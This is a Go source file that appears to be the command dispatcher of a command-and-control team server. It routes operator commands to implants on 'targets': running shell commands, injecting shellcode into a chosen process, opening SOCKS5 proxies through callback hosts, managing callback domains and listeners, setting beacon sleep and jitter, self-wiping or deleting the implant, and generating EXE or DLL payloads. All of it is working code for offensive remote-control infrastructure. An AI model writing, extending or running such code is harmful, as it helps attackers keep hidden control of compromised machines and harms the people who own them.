package client

import (
	"TeamServer/database"
	"TeamServer/debug"
	"TeamServer/macro"
	"TeamServer/support"
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"
)

const EventSessionType int = 7
const EventListener int = 3

//SubEvent
const SubEventSendCommnad int = 1
const SubEventNewListener int = 120
const SubEventDeleteListener int = 121
const SubEventGeneratePayload int = 123

//Command ID Type
const SHELLCommand = "1"
const INJECT_SHELLCODECommand = "2"
const START_PROXYCommand = "3"
const STOP_PROXYCommand = "4"
const ADD_DOMAINCommand = "5"
const DELETE_DOMAINCommand = "6"
const LIST_DOMAINCommand = "7"
const SLEEPCommand = "11"
const KillCommand = "12"
const WipeCommand = "13"
const SelfDelCommand = "14"
const TaskListCommand = "15"
const DelTaskCommand = "16"
const CleanTasksCommand = "17"

type ClientDispatchManager struct {
	Pack   Package
	Client *macro.ClientInfo
}

func NewClientDispatch(Pack Package, Client *macro.ClientInfo) *ClientDispatchManager {
	var ClientDispatchM = new(ClientDispatchManager)
	ClientDispatchM.Pack = Pack
	ClientDispatchM.Client = Client
	return ClientDispatchM
}

func (ds *ClientDispatchManager) ClientDispatch() {

	if ds.Pack.Head.Event == EventSessionType {
		debug.Info("Recive Type %d", ds.Pack.Body.SubEvent)

		if ds.Pack.Body.SubEvent == SubEventSendCommnad {
			if ds.Pack.Body.Info["CommandID"] == SHELLCommand {
				ds.DispatchShell()

			}
			if ds.Pack.Body.Info["CommandID"] == SLEEPCommand {
				ds.DispatchSleep()
			}
			if ds.Pack.Body.Info["CommandID"] == INJECT_SHELLCODECommand {
				ds.DispatchInjectionShellcode()
			}
			if ds.Pack.Body.Info["CommandID"] == START_PROXYCommand {
				ds.DispatchStartProxy()
			}
			if ds.Pack.Body.Info["CommandID"] == STOP_PROXYCommand {
				ds.DispatchStopProxy()
			}
			if ds.Pack.Body.Info["CommandID"] == ADD_DOMAINCommand {
				ds.DispatchAddNewDomain()
			}
			if ds.Pack.Body.Info["CommandID"] == DELETE_DOMAINCommand {
				ds.DispatchDeleteDomain()
			}
			if ds.Pack.Body.Info["CommandID"] == LIST_DOMAINCommand {
				ds.DispatchListDomain()
			}
			if ds.Pack.Body.Info["CommandID"] == KillCommand {
				ds.DispatchSelfKill()
			}
			if ds.Pack.Body.Info["CommandID"] == WipeCommand {
				ds.DispatchSelfWipe()
			}
			if ds.Pack.Body.Info["CommandID"] == SelfDelCommand {
				ds.DispatchSelfDel()
			}

			if ds.Pack.Body.Info["CommandID"] == TaskListCommand {
				ds.DispatchGetTaskList()
			}
			if ds.Pack.Body.Info["CommandID"] == DelTaskCommand {
				ds.DispatchDelTask()
			}
			if ds.Pack.Body.Info["CommandID"] == CleanTasksCommand {
				ds.DispatchCleanTasksList()
			}

		}
		if ds.Pack.Body.SubEvent == SubEventNewListener {
			ds.DispatchNewListener()
		}
		if ds.Pack.Body.SubEvent == SubEventDeleteListener {
			ds.DispatchDeleteListener()
		}
		if ds.Pack.Body.SubEvent == SubEventGeneratePayload {
			ds.DispatchGeneratePayload()
		}
	}
}

func (ds *ClientDispatchManager) DispatchShell() {

	Args, err := base64.StdEncoding.DecodeString(ds.Pack.Body.Info["Args"].(string))
	if err != nil {
		debug.Error("", err)
		return
	}
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	if !ok {
		debug.Error("Target Not Found !")
	}
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.ShellCommand(string(Args))

	return

}

func (ds *ClientDispatchManager) DispatchSleep() {

	Args, err := base64.StdEncoding.DecodeString(ds.Pack.Body.Info["Args"].(string))
	if err != nil {
		debug.Error("", err)
		return
	}

	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	parts := strings.Split(string(Args), ";")
	// Convert the parts to integers
	sleep, err1 := strconv.Atoi(parts[0])
	jit, err2 := strconv.Atoi(parts[1])
	// Check for conversion errors
	if err1 != nil || err2 != nil {
		debug.Error("Invalid input")
		return
	}
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.ChangeSleep(sleep, jit)

	return

}

func (ds *ClientDispatchManager) DispatchInjectionShellcode() {
	Binary, err := base64.StdEncoding.DecodeString(ds.Pack.Body.Info["Binary"].(string))
	if err != nil {
		debug.Error("", err)
		return
	}
	PID, err1 := strconv.Atoi(ds.Pack.Body.Info["PID"].(string))
	if err1 != nil {
		fmt.Println("", err)
		return
	}
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	if !ok {
		debug.Error("Target Not Found !")
		return
	}

	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.Inject(Binary, PID)
	return

}

func (ds *ClientDispatchManager) DispatchStartProxy() {

	CallBackHostName := ds.Pack.Body.Info["CallBackHostName"].(string)
	AgentConnectPort := ds.Pack.Body.Info["AgentConnectPort"].(string)
	ProxyListenerPort := ds.Pack.Body.Info["ProxyListenerPort"].(string)
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}

	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.StartSocks5(CallBackHostName, AgentConnectPort, ProxyListenerPort)

	return

}

func (ds *ClientDispatchManager) DispatchStopProxy() {

	CallBackHostName := ds.Pack.Body.Info["CallBackHostName"].(string)
	AgentConnectPort := ds.Pack.Body.Info["AgentConnectPort"].(string)
	ProxyListenerPort := ds.Pack.Body.Info["ProxyListenerPort"].(string)
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.StopProxy(CallBackHostName, AgentConnectPort, ProxyListenerPort)
	return

}

func (ds *ClientDispatchManager) DispatchAddNewDomain() {

	CallBackDomain := ds.Pack.Body.Info["CallBackDomain"].(string)
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.AddNewCallBackDomain(CallBackDomain)
	return

}

func (ds *ClientDispatchManager) DispatchNewListener() {

	DomainName := ds.Pack.Body.Info["DomainName"].(string)
	ok, NewListener := support.AddNewListener(DomainName)

	if ok {
		go SnedNewMessageBox(ds.Client, "New Listener", "Good", "NewListener Added Successfully", true)
		go SendClientListenerInfo(NewListener, macro.Brodcast, nil)
		err := database.DB.ListenerInfoHandler.AddListenerInfo(NewListener)
		if err != nil {
			debug.Error(err.Error())
		}
		return
	}

	go SnedNewMessageBox(ds.Client, "New Listener", "Error", "Fail to Add Listener!", false)

	return

}

func (ds *ClientDispatchManager) DispatchDeleteListener() {

	DomainName := ds.Pack.Body.Info["DomainName"].(string)
	ok, RemovedListener := support.DeleteListener(DomainName)

	if ok {
		go SendClientDelListenerInfo(RemovedListener, macro.Brodcast, nil)
		go SnedNewMessageBox(ds.Client, "Remove Listener", "Good", "Listener Removed Successfully", true)
		return
	}

	go SnedNewMessageBox(ds.Client, "Error Listener", "Error", "Fail to Remove Listener!", false)

	return

}

func (ds *ClientDispatchManager) DispatchDeleteDomain() {

	CallBackDomain := ds.Pack.Body.Info["CallBackDomain"].(string)
	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.DeleteCallBackDomain(CallBackDomain)
	return

}

func (ds *ClientDispatchManager) DispatchListDomain() {

	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.ListAllActiveDomain()
	return

}

func (ds *ClientDispatchManager) DispatchSelfKill() {

	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.SelfKill()
	return

}

func (ds *ClientDispatchManager) DispatchSelfWipe() {

	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.SelfWipe()
	return

}

func (ds *ClientDispatchManager) DispatchSelfDel() {

	TargetInfo, ok := macro.TargetMap[ds.Pack.Body.Info["TargetID"].(string)]
	TaskID := ds.Pack.Body.Info["TaskID"].(string)
	if !ok {
		debug.Error("Target Not Found !")
		return
	}
	TaskM := NewTaskManager(TargetInfo, TaskID, nil)
	TaskM.SelfDel()
	return

}

func (ds *ClientDispatchManager) DispatchGeneratePayload() {

	OS := ds.Pack.Body.Info["OS"].(string)
	Type := ds.Pack.Body.Info["Type"].(string)
	Path := ds.Pack.Body.Info["Path"].(string)
	Name := ds.Pack.Body.Info["Name"].(string)
	FunctionName := ""
	DLLType := ""
	listenersInterface := ds.Pack.Body.Info["Listeners"].([]interface{})

	// Convert []interface{} to []string
	Listeners := make([]string, len(listenersInterface))
	for i, v := range listenersInterface {
		str := v.(string)
		Listeners[i] = str
	}
	if Type == "dll" {
		DLLType = ds.Pack.Body.Info["DLLType"].(string)
		if DLLType == "EXPORT_FUNCTION" {
			FunctionName = ds.Pack.Body.Info["ExportFunction"].(string)
		}
	}
	payload, sessionID, err := support.GenerateNewPayload(OS, Type, Listeners, DLLType, FunctionName)
	if err != nil {
		debug.Error("generate payload", err.Error())
		go SendNewPayload(ds.Client, payload, Type, OS, Path, Name, "Error")
		return
	}
	InitializeNewTarget(sessionID)
	go SendNewPayload(ds.Client, payload, Type, OS, Path, Name, "0")

	return

}

func (ds *ClientDispatchManager) DispatchGetTaskList() {
	TargetID, ok := ds.Pack.Body.Info["TargetID"].(string)
	if !ok {
		debug.Error("Invalid TargetID.")
		return
	}

	TargetInfo, ok := macro.TargetMap[TargetID]
	if !ok {
		debug.Error("Error: Target not found")
		return
	}

	// Checking if TaskContainer is empty and returning a specific message if true
	if len(TargetInfo.TaskContainer) == 0 {
		SendConsoleSuccessful(TargetInfo.TargetData, "No task in queue")
		return

	}

	// Looping through TaskContainer to build the result string

	SendConsoleSuccessful(TargetInfo.TargetData, "Task List:")
	for i, task := range TargetInfo.TaskContainer {

		result := fmt.Sprintf("[%d] Task: %s - ID: %s\r\n", i+1, task.TaskName, task.TaskID)
		SendConsoleSuccessful(TargetInfo.TargetData, result)

	}

	return
}

func (ds *ClientDispatchManager) DispatchDelTask() {
	TargetID, ok := ds.Pack.Body.Info["TargetID"].(string)
	if !ok {
		debug.Error("Invalid TargetID.")
		return
	}

	DelTaskID, ok := ds.Pack.Body.Info["DelTaskID"].(string)
	if !ok {
		debug.Error("Invalid Task ID.")
		return
	}

	TargetInfo, ok := macro.TargetMap[TargetID]
	if !ok {
		SendConsoleWarning(TargetInfo.TargetData, "Error: Target not found")
		debug.Error("Error: Target not found")
		return
	}

	// Checking if TaskContainer is empty and returning a specific message if true
	if len(TargetInfo.TaskContainer) == 0 {
		SendConsoleSuccessful(TargetInfo.TargetData, "No task in queue")
		return

	}

	// Looping through TaskContainer to build the result string

	SendConsoleSuccessful(TargetInfo.TargetData, "Task List:")
	TargetInfo.Lock()
	defer TargetInfo.Unlock()
	for i, task := range TargetInfo.TaskContainer {
		if task.TaskID == DelTaskID {
			TargetInfo.TaskContainer = append(TargetInfo.TaskContainer[:i], TargetInfo.TaskContainer[i+1:]...)
			result := fmt.Sprintf("[%d] Task: %s - ID: %s\r\n Deleted Successfully", i+1, task.TaskName, task.TaskID)
			SendConsoleSuccessful(TargetInfo.TargetData, result)
			return

		}

	}
	SendConsoleWarning(TargetInfo.TargetData, "Task ID Not Found")
	return
}

func (ds *ClientDispatchManager) DispatchCleanTasksList() {
	TargetID, ok := ds.Pack.Body.Info["TargetID"].(string)
	if !ok {
		debug.Error("Invalid TargetID.")
		return
	}

	TargetInfo, ok := macro.TargetMap[TargetID]
	if !ok {
		debug.Error("Error: Target not found")
		return
	}

	// Checking if TaskContainer is empty and returning a specific message if true
	if len(TargetInfo.TaskContainer) == 0 {
		SendConsoleSuccessful(TargetInfo.TargetData, "No task in queue")
		return
	}

	// Clean TaskContainer by setting it to nil
	TargetInfo.TaskContainer = nil
	SendConsoleSuccessful(TargetInfo.TargetData, "Task queue cleared")

	return
}
